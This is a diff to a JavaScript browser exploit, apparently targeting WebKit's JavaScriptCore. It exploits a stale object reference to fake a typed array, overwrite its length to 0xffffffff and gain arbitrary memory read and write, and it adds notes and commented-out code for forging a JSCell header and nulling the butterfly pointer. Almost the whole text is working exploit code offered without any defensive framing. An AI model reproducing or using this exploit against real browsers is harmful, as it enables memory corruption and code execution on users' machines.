@@ -170,7 +170,13 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				//alert("Found the object!!");
+				// Create fakeobj for fixing butterfly ptr
+				//var fakeobj = {};
+				
+				// leak fakeobj pointer
+				//stale[0] = fakeobj;
+				//var fop = bufs[i][k];
+				
 
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
@@ -185,36 +191,55 @@ function go_() {
 				/*
 				Array internals:
 					void* JSCell
-					void* m_vector;
 					void* butterflyptr
+					void* m_vector;
 					uint32_t m_length;
 					TypedArrayMode m_mode;
 					
-					stale[0][0] == first32(JSCell)
-					stale[0][1] == second32(JSCell)
-					stale[0][2] == first32(m_Vector)
-					stale[0][3] == second32(m_Vector)
-					stale[0][4] == first32(butterflyptr)
-					stale[0][5] == second32(butterflyptr)
+					stale[0][0] == first32(JSCell)		= 0x00
+					stale[0][1] == second32(JSCell)		= 0x04
+					stale[0][2] == first32(butterflyptr)	= 0x08
+					stale[0][3] == second32(butterflyptr)	= 0x0C
+					stale[0][4] == first32(m_Vector)
+					stale[0][5] == second32(m_Vector)
 					stale[0][6] == m_length
 				*/
 
 				
-				//alert("Accesing stale[0]");
-				//var x = stale[0];
-				//alert("Accesing stale[0]");
-				
-				//alert("Orginal smsh len:" + smsh.length);
+
 				stale[0][6] = 0xffffffff; // Overide m_length field
-				//alert("New smsh len:" + smsh.length);
-				
-				// Adding new code here
 				bck = stale[0][4];
 				stale[0][4] = 0; // address, low 32 bits
 				mem0 = stale[0];
  				mem1 = bck;
  				mem2 = smsh;
  				bufs.push(stale)
+				
+				/*
+				    1. Create an empty object. The structure of this object will describe
+				       an object with the default amount of inline storage (6 slots), but
+				       none of them being used.
+
+				    2. Copy the JSCell header (containing the structure ID) to the
+				       container object. We've now caused the engine to "forget" about the
+				       properties of the container object that make up our fake array.
+
+				    3. Set the butterfly pointer of the fake array to nullptr, and, while
+				       we're at it also replace the JSCell of that object with one from a
+				       default Float64Array instance
+				*/
+				
+				// Copy the JSCell header:
+				// Write to the container object
+				//write4((bufs[i][k] - 0x10), read4(fop)); // Low 32 bits of the JSCell Header
+				//write4((bufs[i][k] - 0x10) + 4, read4(fop + 4)); // High 32 bits of the JSCell Header
+				//fakeobj['a'] = 1; // Make _SURE_ fakeobj stays alive until this point
+
+				// Set the butterfly pointer of the fake array to nullptr
+				//write4(bufs[i][k] + 0x08, 0);
+				//write4(bufs[i][k] + 0x0C, 0);
+				
+				
 				
  				if (smsh.length != 0x10) {
  					smashed(stale[0]);
